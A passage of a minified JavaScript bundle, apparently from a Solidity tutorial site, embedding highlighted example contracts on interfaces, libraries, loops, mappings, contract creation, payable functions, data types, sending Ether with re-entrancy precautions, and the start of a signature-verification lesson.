class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>)</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increment</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span></span>;\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MyContract</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">incrementCounter</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _counter</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{\n        ICounter(_counter).increment();\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCount</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _counter</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> ICounter(_counter).count();\n    }\n}\n\n<span class="hljs-comment">// Uniswap example</span>\n<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UniswapV2Factory</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPair</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> tokenA, <span class="hljs-keyword">address</span> tokenB</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span> pair</span>)</span>;\n}\n\n<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UniswapV2Pair</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReserves</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint112</span> reserve0, <span class="hljs-keyword">uint112</span> reserve1, <span class="hljs-keyword">uint32</span> blockTimestampLast</span>)</span>;\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">UniswapExample</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> factory = <span class="hljs-number">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span>;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> dai = <span class="hljs-number">0x6B175474E89094C44Da98b954EedeAC495271d0F</span>;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> weth = <span class="hljs-number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenReserves</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>, <span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">address</span> pair = UniswapV2Factory(factory).getPair(dai, weth);\n        (<span class="hljs-keyword">uint</span> reserve0, <span class="hljs-keyword">uint</span> reserve1, ) = UniswapV2Pair(pair).getReserves();\n        <span class="hljs-keyword">return</span> (reserve0, reserve1);\n    }\n}\n</code></pre>\n'})};var js=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Library",description:"Example of how to write and use libraries in your Solidity code",html:'<p>Libraries are similar to contracts, but you can&#39;t declare any state variable and\nyou can&#39;t send ether.</p>\n<p>A library is embedded into the contract if all library functions are internal.</p>\n<p>Otherwise the library must be deployed and then linked before the contract is deployed.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">library</span> <span class="hljs-title">SafeMath</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> x, <span class="hljs-keyword">uint</span> y</span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">uint</span> z = x + y;\n        <span class="hljs-built_in">require</span>(z &gt;= x, <span class="hljs-string">"uint overflow"</span>);\n\n        <span class="hljs-keyword">return</span> z;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TestSafeMath</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">SafeMath</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">uint</span></span>;\n\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> MAX_UINT = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span> - <span class="hljs-number">1</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testAdd</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> x, <span class="hljs-keyword">uint</span> y</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> x.add(y);\n    }\n}\n\n<span class="hljs-comment">// Array function to delete element at index and re-organize the array</span>\n<span class="hljs-comment">// so that their are no gaps between the elements.</span>\n<span class="hljs-class"><span class="hljs-keyword">library</span> <span class="hljs-title">Array</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">storage</span> arr, <span class="hljs-keyword">uint</span> index</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Move the last element into the place to delete</span>\n        arr[index] = arr[arr.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>];\n        arr.<span class="hljs-built_in">pop</span>();\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TestArray</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">Array</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">uint</span></span>[];\n\n    <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">public</span> arr;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testArrayRemove</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) {\n            arr.<span class="hljs-built_in">push</span>(i);\n        }\n\n        arr.remove(<span class="hljs-number">1</span>);\n\n        <span class="hljs-built_in">assert</span>(arr.<span class="hljs-built_in">length</span> == <span class="hljs-number">2</span>);\n        <span class="hljs-built_in">assert</span>(arr[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>);\n        <span class="hljs-built_in">assert</span>(arr[<span class="hljs-number">1</span>] == <span class="hljs-number">2</span>);\n    }\n}\n</code></pre>\n'})};var ds=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"For and While Loop",description:"Example of for and while loop in Solidity",html:'<p>Solidity supports <code>for</code>, <code>while</code>, and <code>do while</code> loops.</p>\n<p>Don&#39;t write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.</p>\n<p>For the reason above, <code>while</code> and <code>do while</code> loops are rarely used.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Loop</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loop</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// for loop</span>\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {\n            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">3</span>) {\n                <span class="hljs-comment">// Skip to next iteration with continue</span>\n                <span class="hljs-keyword">continue</span>;\n            }\n            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>) {\n                <span class="hljs-comment">// Exit loop with break</span>\n                <span class="hljs-keyword">break</span>;\n            }\n        }\n\n        <span class="hljs-comment">// while loop</span>\n        <span class="hljs-keyword">uint</span> j;\n        <span class="hljs-keyword">while</span> (j &lt; <span class="hljs-number">10</span>) {\n            j++;\n        }\n    }\n}\n</code></pre>\n'})};var us=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Mapping",description:"Example of using mapping in Solidity",html:'<p>Maps are created with the syntax <code>mapping(keyType =&gt; valueType)</code>.</p>\n<p><code>keyType</code> can be value types such as <code>uint</code>, <code>address</code> or <code>bytes</code>.</p>\n<p><code>valueType</code> can be any type including another mapping or an array.</p>\n<p>Mappings are not iterable.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Mapping</span> </span>{\n    <span class="hljs-comment">// Mapping from address to uint</span>\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> myMap;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n         <span class="hljs-comment">// Mapping always returns a value.</span>\n         <span class="hljs-comment">// If the value was never set, it will return the default value.</span>\n        <span class="hljs-keyword">return</span> myMap[_addr];\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr, <span class="hljs-keyword">uint</span> _i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Update the value at this address</span>\n        myMap[_addr] = _i;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Reset the value to the default value.</span>\n        <span class="hljs-keyword">delete</span> myMap[_addr];\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">NestedMapping</span> </span>{\n    <span class="hljs-comment">// Nested mapping (mapping from address to another mapping)</span>\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">uint</span> =&gt; <span class="hljs-keyword">bool</span>)) <span class="hljs-keyword">public</span> nested;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr1, <span class="hljs-keyword">uint</span> _i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n         <span class="hljs-comment">// You can get values from a nested mapping</span>\n         <span class="hljs-comment">// even when it is not initialized</span>\n        <span class="hljs-keyword">return</span>  nested[_addr1][_i];\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr1, <span class="hljs-keyword">uint</span> _i, <span class="hljs-keyword">bool</span> _boo</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        nested[_addr1][_i] = _boo;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr1, <span class="hljs-keyword">uint</span> _i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">delete</span> nested[_addr1][_i];\n    }\n}\n</code></pre>\n'})};var ys=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Contract that Create other Contracts",description:"Learn how to create new contract from inside a contract with Solidity",html:'<p>Contracts can be created by other contracts using the <code>new</code> keyword.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Car</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> model;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _owner, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _model</span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        owner = _owner;\n        model = _model;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">CarFactory</span> </span>{\n    Car[] <span class="hljs-keyword">public</span> cars;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _owner, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _model</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        Car car = <span class="hljs-keyword">new</span> Car(_owner, _model);\n        cars.<span class="hljs-built_in">push</span>(car);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createAndSendEther</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _owner, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _model</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title"><span class="hljs-keyword">payable</span></span>\n    </span>{\n        Car car = (<span class="hljs-keyword">new</span> Car){<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}(_owner, _model);\n        cars.<span class="hljs-built_in">push</span>(car);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCar</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _index</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title"><span class="hljs-keyword">view</span></span>\n        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span> owner, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> model, <span class="hljs-keyword">uint</span> balance</span>)\n    </span>{\n        Car car = cars[_index];\n\n        <span class="hljs-keyword">return</span> (car.owner(), car.model(), <span class="hljs-keyword">address</span>(car).<span class="hljs-built_in">balance</span>);\n    }\n}\n</code></pre>\n'})};var ms=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Payable",description:"An example of how to use the keyword payable in Solidity",html:'<p>Functions and addresses declared <code>payable</code> can receive <code>ether</code> into the contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Payable</span> </span>{\n    <span class="hljs-comment">// Payable address can receive Ether</span>\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> owner;\n\n    <span class="hljs-comment">// Payable constructor can receive Ether</span>\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        owner = <span class="hljs-keyword">payable</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);\n    }\n\n    <span class="hljs-comment">// Function to deposit Ether into this contract.</span>\n    <span class="hljs-comment">// Call this function along with some Ether.</span>\n    <span class="hljs-comment">// The balance of this contract will be automatically updated.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n    }\n\n    <span class="hljs-comment">// Call this function along with some Ether.</span>\n    <span class="hljs-comment">// The function will throw an error since this function is not payable.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">notPayable</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n    }\n\n    <span class="hljs-comment">// Function to withdraw all Ether from this contract.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// get the amount of Ether stored in this contract</span>\n        <span class="hljs-keyword">uint</span> amount = <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n\n        <span class="hljs-comment">// send all Ether to owner</span>\n        <span class="hljs-comment">// Owner can receive Ether since the address of owner is payable</span>\n        (<span class="hljs-keyword">bool</span> success,) = owner.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(success, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n\n    <span class="hljs-comment">// Function to transfer Ether from this contract to address from input</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Note that "to" is declared as payable</span>\n        (<span class="hljs-keyword">bool</span> success,) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(success, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n</code></pre>\n'})};var ws=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Primitive Data Types",description:"Primitive data types",html:'<p>Here we introduce you to some primitive data types available in Solidity.</p>\n<ul>\n<li><code>boolean</code></li>\n<li><code>uint</code></li>\n<li><code>int</code></li>\n<li><code>address</code></li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Primitives</span> </span>{\n    <span class="hljs-keyword">bool</span> boo = <span class="hljs-literal">true</span>;\n\n    <span class="hljs-comment">/*\n    uint stands for unsigned integer, meaning non negative integers\n    different sizes are available\n        uint8   ranges from 0 to 2 ** 8 - 1\n        uint16  ranges from 0 to 2 ** 16 - 1\n        ...\n        uint256 ranges from 0 to 2 ** 256 - 1\n    */</span>\n    <span class="hljs-keyword">uint8</span> u8 = <span class="hljs-number">1</span>;\n    <span class="hljs-keyword">uint256</span> u256 = <span class="hljs-number">456</span>;\n    <span class="hljs-keyword">uint</span> u = <span class="hljs-number">123</span>; <span class="hljs-comment">// uint is an alias for uint256</span>\n\n    <span class="hljs-comment">/*\n    Negative numbers are allowed for int types.\n    Like uint, different ranges are available from uint8 to uint256\n    */</span>\n    <span class="hljs-keyword">int8</span> i8 = <span class="hljs-number">-1</span>;\n    <span class="hljs-keyword">int256</span> i256 = <span class="hljs-number">456</span>;\n    <span class="hljs-keyword">int</span> i = <span class="hljs-number">-123</span>; <span class="hljs-comment">// int is same as int256</span>\n\n    <span class="hljs-keyword">address</span> addr = <span class="hljs-number">0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c</span>;\n\n    <span class="hljs-comment">// Default values</span>\n    <span class="hljs-comment">// Unassigned variables have a default value</span>\n    <span class="hljs-keyword">bool</span> defaultBoo; <span class="hljs-comment">// false</span>\n    <span class="hljs-keyword">uint</span> defaultUint; <span class="hljs-comment">// 0</span>\n    <span class="hljs-keyword">int</span> defaultInt; <span class="hljs-comment">// 0</span>\n    <span class="hljs-keyword">address</span> defaultAddr; <span class="hljs-comment">// 0x0000000000000000000000000000000000000000</span>\n}\n</code></pre>\n'})};var ks=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Sending Ether (transfer, send, call)",description:"An example of sending Ether in Solidity",html:'<h3 id="how-to-send-ether">How to send Ether?</h3>\n<p>You can send Ether to other contracts by</p>\n<ul>\n<li><code>transfer</code> (2300 gas, throws error)</li>\n<li><code>send</code> (2300 gas, returns bool)</li>\n<li><code>call</code> (forward all gas or set gas, returns bool)</li>\n</ul>\n<h3 id="how-to-receive-ether">How to receive Ether?</h3>\n<p>A contract receiving Ether must have at least one of the functions below</p>\n<ul>\n<li><code>receive() external payable</code></li>\n<li><code>fallback() external payable</code></li>\n</ul>\n<p><code>receive()</code> is called if <code>msg.data</code> is empty, otherwise <code>fallback()</code> is called.</p>\n<h3 id="which-method-should-you-use">Which method should you use?</h3>\n<p><code>call</code> in combination with re-entrancy guard is the recommended method to use after December 2019.</p>\n<p>Guard against re-entrancy by</p>\n<ul>\n<li>making all state changes before calling other contracts</li>\n<li>using re-entrancy guard modifier</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReceiveEther</span> </span>{\n    <span class="hljs-comment">/*\n    Which function is called, fallback() or receive()?\n\n           send Ether\n               |\n         msg.data is empty?\n              / \\\n            yes  no\n            /     \\\nreceive() exists?  fallback()\n         /   \\\n        yes   no\n        /      \\\n    receive()   fallback()\n    */</span>\n\n    <span class="hljs-comment">// Function to receive Ether. msg.data must be empty</span>\n    <span class="hljs-keyword">receive</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {}\n\n    <span class="hljs-comment">// Fallback function is called when msg.data is not empty</span>\n    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">SendEther</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendViaTransfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-comment">// This function is no longer recommended for sending Ether.</span>\n        _to.<span class="hljs-built_in">transfer</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendViaSend</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-comment">// Send returns a boolean value indicating success or failure.</span>\n        <span class="hljs-comment">// This function is not recommended for sending Ether.</span>\n        <span class="hljs-keyword">bool</span> sent = _to.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendViaCall</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-comment">// Call returns a boolean value indicating success or failure.</span>\n        <span class="hljs-comment">// This is the current recommended method to use.</span>\n        (<span class="hljs-keyword">bool</span> sent, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> data) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n</code></pre>\n'})};var bs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Shadowing Inherited State Variables",description:"An example of shadowing state variables by inheritance",html:'<p>Unlike functions, state variables cannot be overridden by re-declaring it\nin the child contract.</p>\n<p>Let&#39;s learn how to correctly override inherited state variables.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> name = <span class="hljs-string">"Contract A"</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getName</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> name;\n    }\n}\n\n<span class="hljs-comment">// Shadowing is disallowed in Solidity 0.6</span>\n<span class="hljs-comment">// This will not compile</span>\n<span class="hljs-comment">// contract B is A {</span>\n<span class="hljs-comment">//     string public name = "Contract B";</span>\n<span class="hljs-comment">// }</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">C</span> <span class="hljs-keyword">is</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-comment">// This is the correct way to override inherited state variables.</span>\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) </span>{\n        name = <span class="hljs-string">"Contract C"</span>;\n    }\n\n    <span class="hljs-comment">// C.getName returns "Contract C"</span>\n}\n</code></pre>\n'})};var fs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Verifying Signature",description:"An example of how to verify signatures in Solidity",html:'<p>Messages can be signed off chain and then verified on chain using a smart contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">VerifySignature</span> </span>{\n    <span class="hljs-comment">/* 1. Unlock MetaMask account\n    ethereum.enable()\n    */</span>\n\n    <span class="hljs-comment">/* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        "coffee and donuts",\n        1\n    )\n\n    hash = "0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd"\n    */</span>\n    <span 